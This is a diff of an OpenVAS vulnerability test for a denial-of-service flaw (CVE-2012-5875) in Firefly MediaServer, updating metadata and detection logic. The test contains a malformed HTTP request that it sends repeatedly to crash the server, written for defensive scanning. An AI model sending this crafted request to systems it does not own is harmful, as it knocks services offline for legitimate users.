@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_firefly_mediaserver_mult_dos_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
+# $Id: gb_firefly_mediaserver_mult_dos_vuln.nasl 11432 2018-09-17 11:59:28Z cfischer $
 #
 # Firefly MediaServer HTTP Header Multiple DoS Vulnerabilities
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803080");
-  script_version("$Revision: 11374 $");
+  script_version("$Revision: 11432 $");
   script_cve_id("CVE-2012-5875");
   script_bugtraq_id(56999);
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 13:59:28 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-12-20 15:49:00 +0530 (Thu, 20 Dec 2012)");
   script_name("Firefly MediaServer HTTP Header Multiple DoS Vulnerabilities");
   script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/80743");
@@ -44,9 +44,9 @@ if(description)
   script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
   script_family("Denial of Service");
-  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_dependencies("gb_get_http_banner.nasl");
   script_require_ports(9999);
-  script_exclude_keys("Settings/disable_cgi_scanning");
+  script_mandatory_keys("mt-daapd/banner");
 
   script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause the server
 to crash, denying service to legitimate users.");
@@ -61,12 +61,12 @@ General solution options are to upgrade to a newer release, disable respective f
   script_tag(name:"summary", value:"This host is running Firefly MediaServer and is prone to multiple
 denial of service vulnerabilities.");
   script_tag(name:"solution_type", value:"WillNotFix");
+
   exit(0);
 }
 
 include("http_func.inc");
 
-fmReq = "";
 fmPort = 9999;
 if(!get_port_state(fmPort)){
   exit(0);
@@ -77,25 +77,24 @@ if("Server: mt-daapd" >!< banner){
   exit(0);
 }
 
+useragent = get_http_user_agent();
 host = http_host_name(port:fmPort);
 
 fmExp = string("GET / HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
-               "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
+               "User-Agent: ", useragent, "\r\n",
                "Accept-Language: en-us\r\n",
                "en;q=0.5\r\n",
                "\r\n",
                "\r\n",
                "Connection: keep-alive\r\n\r\n");
 
-## Send crafted request
 for(i=0; i<3; i++)
-http_send_recv(port: fmPort, data:fmExp);
+  http_send_recv(port: fmPort, data:fmExp);
 
 sleep(2);
 
-## Send Normal Get request and check the response
+fmReq = string("GET / HTTP/1.1\r\n\r\n");
 fmRes = http_send_recv(port: fmPort, data:fmReq);
-
 if(!fmRes)
-security_message(fmPort);
+  security_message(fmPort);
